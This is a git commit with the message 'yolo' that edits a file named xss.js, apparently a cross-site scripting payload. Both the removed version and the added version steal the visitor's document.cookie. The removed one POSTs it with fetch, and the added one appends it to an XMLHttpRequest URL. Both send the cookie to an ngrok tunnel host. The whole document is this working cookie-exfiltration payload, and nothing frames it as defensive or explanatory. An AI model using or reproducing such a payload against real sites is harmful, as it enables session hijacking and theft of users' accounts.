8850fc062365667908732c02f6ad545f7aee5116
t0wb0at <t0wb0at@protonmail.com>
2023-03-18 20:29:41 +0100

    yolo

--- xss.js
+++ xss.js
@@ -1,7 +1,3 @@
-<script>
-fetch('https://86f6-94-112-147-88.ngrok.io', {
-method: 'POST',
-mode: 'no-cors',
-body:document.cookie
-});
-</script>
+var xhttp = new XMLHttpRequest();
+xhttp.open('GET', 'https://86f6-94-112-147-88.ngrok.io/' + document.cookie, true);
+xhttp.send();
